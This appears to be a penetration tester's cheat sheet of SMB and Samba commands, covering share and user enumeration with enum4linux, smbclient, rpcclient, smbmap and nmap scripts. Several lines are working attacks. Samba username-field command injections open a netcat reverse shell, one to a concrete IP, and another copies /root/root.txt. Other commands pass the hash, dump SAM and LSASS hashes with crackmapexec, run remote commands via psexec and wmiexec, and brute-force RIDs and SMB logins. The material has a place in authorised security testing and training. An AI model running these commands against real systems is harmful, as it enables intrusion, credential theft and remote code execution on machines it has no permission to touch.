## Information gathering
### enum4linux
enum4linux IP

### smbclient
List all shares.

smbclient -L \\\\IP\\

Log in one specific share

smbclient -N \\\\IP\\tmp -U ""

### rpcclient
rpcclient -N -U "" target_IP_Address

hittig tab 2x you got all options for enum

other commands are: enumalsgroups, srvinfo, lookupnames, queryuser, enumprivs

Recurisive download

smbclient '\\server\share'
    mask ""
    
    recurse ON
    
    prompt OFF
    
    cd 'path\to\remote\dir'
    
    lcd '~/path/to/download/to/'
    
    mget *
 
Copying files

To copy the file from the local file systemt to the SMB server:

smb: \> put local_file remote_file

To copy the file from the SMB serverto the local file systemt:

smb: \> get remote_file local_file
 
 
Get data files

get Name

### Connect to a share with windows
net use K: \\IP\share

net use \\ip\share “” /u:""

establishing a connection to the hidden share IPC$

• at the IP address IPADRESS

• with a null password

• and an empty (anonymous) username.

sudo mount.cifs //IPADRESS/C /media/K_share user=,pass=

### common windows shares:

IPC$

C$

ADMIN$

### useful windows tools
winfingerprint

winfo targetip -n

DumpSec

### SMB

Port 139 and 445- SMB/Samba shares
Samba is a service that enables the user to share files with other machines

works the same as a command line FTP client, may browse files without even having credentials

### Share List with :
smbclient --list targetip
smbclient -L targetip

### Check SMB vulnerabilities with nmap:
nmap --script=smb-check-vulns.nse targetip -p445


### Connect using Username
root@kali:~# smbclient -L <targetip> -U username -p 445

### Connect to Shares
smbclient \\\\targetip\\ShareName

smbclient \\\\targetip\\ShareName -U john

mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//ip/My Share" /mnt/cifs

### enumarete with smb-shares, -a “do everything” option
enum4linux -a 192.168.1.120

### learn the machine name and then enumerate with smbclient

nmblookup -A 192.168.1.102

smbclient -L server_name -I ipadress

### rpcclient - Connect with a null-session (only works for older windows servers)
rpcclient -U james ipadress

rpcclient -U "" ipadress

(press enter if asks for a password)

rpcclient $> srvinfo

rpcclient $> enumdomusers

rpcclient $> enumalsgroups domain

rpcclient $> lookupnames administrators

rpcclient> querydominfo

rpcclient> enumdomusers

rpcclient> queryuser john


nbtscan -r ip/24

enum4linux -a ip

### rcpclient
rpcclient -U "" ip

srvinfo

enumdomusers

getdompwinfo

querydominfo

netshareenum

netshareenumall

### smbclient
smbclient -L x.x.x.x

smbmount //x.x.x.x/share /mnt –o username=hoor,workgroup=hdor

smbclient \\\\x.x.x.x\\share

enum4linux -a ip

rpcclient -U "" x.x.x.x  #Anonymous bind using rpcclient / Null connect

smbclient //MOUNT/share #Connect to SMB share

smbclient -U "/=&#92;&#96;nohup nc -e /bin/sh LHOST LPORT&#92;&#96;" -N -I ip //LAME/tmp

nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip

smbclient //ip/tmp

logon "./=`nohup nc -e /bin/sh LHOST LPORT`"

smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I ip //LAME/tmp

smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I ip //LAME/tmp

smbclient -L ip

enum4linux -S ip



### Mounting a share
mount ip:/vol/share /mnt/nfs  -nolock

mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs

mount -t cifs //x.x.x.x/share /mnt

mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt

### Mounting File Share
showmount -e IPADDR

sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other

nbtscan -r 192.168.0.1/24


### Dump interesting information
enum4linux -a [-u "username" -p "passwd"] IP


### Connect to the rpc
rpcclient -U "" -N <IP> #No creds

rpcclient -U "username" [--pw-nt-hash] <IP> #Ask for password/NT hash

You can use querydispinfo and enumdomusers to query user information

### Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]targetName or address

/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]targetName or address

### Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]targetName or address

/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]targetName or address

/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]targetName or address

smbclient --no-pass -L //<IP> # Null user

smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user

smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds

smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash

### crackmapexec
apt-get install crackmapexec

crackmapexec smb IP -u '' -p '' --shares #Null user

crackmapexec smb IP -u 'username' -p 'password' --shares #Guest user

crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell

crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd

crackmapexec 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash

Using --exec-method -1,2,3 wmiexec,atexec,smbexec

crackmapexec -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM

crackmapexec -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes

### Connect using smbclient
smbclient --no-pass //IP/Folder

smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //IP #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

### List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list

smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list

smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash

mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

### Search a file and download
sudo smbmap -R Folder -H IP -A FileName -q # Search the file in recursive mode and download it inside /usr/share/smbmap

### Download all
smbclient //IP/share

recurse ON

prompt OFF

mget *

Download everything to current directory

### psexec
If no password is provided, it will be prompted

./psexec.py [[domain/]username[:password]@]targetName_or_address

./psexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash

psexec \\IP -u Administrator -p 123456Ww

psexec \\IP -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash

If no password is provided, it will be prompted

./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password

./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash

You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted


ridenum.py IP 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusername

## nmap
basic nmap scripts to enumerate shares and OS discovery

nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse

scan for vulnerabilities with nmap

nmap --script "vuln" <targetip> -p139,445

SMB Users and share Scan

nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse ip

SMB Vulnerability Scan
nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse ip

nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 ip

nmap --script=smb-check-vulns.nse x.x.x.x

nmap --script "safe or smb-enum-*" -p 445 <IP>

nmap --script smb-brute -p 445 <IP>
